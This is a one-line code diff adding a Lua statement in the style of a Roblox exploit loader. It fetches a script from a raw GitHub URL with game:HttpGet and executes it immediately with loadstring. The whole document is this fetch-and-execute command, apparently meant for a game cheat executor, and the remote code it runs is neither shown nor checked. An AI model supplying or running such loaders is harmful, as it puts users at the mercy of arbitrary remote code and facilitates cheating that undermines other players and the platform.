@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XCK100/XCK/refs/heads/main/XCK%EF%BC%BB%E4%B8%BB%EF%BC%BD.txt"))()
